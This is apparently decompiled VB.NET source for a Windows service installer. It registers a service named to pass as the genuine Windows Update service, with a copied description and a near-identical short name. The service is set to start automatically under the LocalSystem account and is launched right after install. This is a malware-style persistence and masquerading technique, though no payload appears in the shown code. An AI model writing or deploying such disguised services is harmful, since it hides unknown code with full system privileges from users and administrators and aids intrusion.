Imports System
Imports System.ComponentModel
Imports System.Configuration.Install
Imports System.ServiceProcess

Namespace Main.Tools
	' Token: 0x0200005E RID: 94
	<RunInstaller(True)>
	Public Class MyWindowsServiceInstaller
		Inherits Installer

		' Token: 0x060001E1 RID: 481 RVA: 0x000115FC File Offset: 0x0000F7FC
		Public Sub New()
			Dim serviceProcessInstaller As ServiceProcessInstaller = New ServiceProcessInstaller()
			Dim serviceInstaller As ServiceInstaller = New ServiceInstaller()
			serviceInstaller.DisplayName = "Windows Update Service"
			serviceInstaller.Description = "Provides detection and installation of Windows Updates."
			serviceInstaller.ServiceName = "wuaserv"
			serviceInstaller.StartType = ServiceStartMode.Automatic
			serviceProcessInstaller.Account = ServiceAccount.LocalSystem
			MyBase.Installers.Add(serviceProcessInstaller)
			MyBase.Installers.Add(serviceInstaller)
		End Sub

		' Token: 0x060001E2 RID: 482 RVA: 0x00011664 File Offset: 0x0000F864
		Private Sub ServiceInstaller_AfterInstall(sender As Object, e As InstallEventArgs)
			For Each serviceController As ServiceController In ServiceController.GetServices()
				If serviceController.ServiceName = "wuaserv" Then
					serviceController.Start()
				End If
			Next
		End Sub
	End Class
End Namespace
